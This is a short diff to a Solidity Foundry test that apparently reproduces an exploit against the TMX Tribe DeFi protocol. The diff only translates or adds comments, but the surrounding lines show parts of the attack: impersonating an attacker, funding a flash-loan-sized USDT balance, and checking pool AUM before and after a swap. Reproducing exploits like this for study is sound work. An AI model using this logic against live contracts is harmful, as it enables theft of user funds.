@@ -39,7 +39,7 @@ contract TMXTribeTest is BaseTest {
         // Set beneficiary if needed: beneficiary = address(0x123);
         // Profit will be automatically calculated and logged
         vm.startPrank(ATTACKER, ATTACKER);
-        // USDT 입금
+        // Deposit USDT
         uint256 flashLoan_amount = 137_774_886_748; // 137,774.886748 USDT
         deal(address(USDT_TOKEN), ATTACKER, flashLoan_amount);
 
@@ -68,7 +68,7 @@ contract TMXTribeTest is BaseTest {
             FSTLP.balanceOf(address(ATTACKER)),
             18
         );
-
+        // Check Aums before Swap
         (bool s8, bytes memory aums) = glpManager.call(
             abi.encodeWithSignature("getAums()")
         );
@@ -100,6 +100,8 @@ contract TMXTribeTest is BaseTest {
             USDG.balanceOf(address(ATTACKER)),
             6
         );
+
+        // Check Aums after Swap -> Aum is increased
         (bool s9, bytes memory aums2) = glpManager.call(
             abi.encodeWithSignature("getAums()")
         );
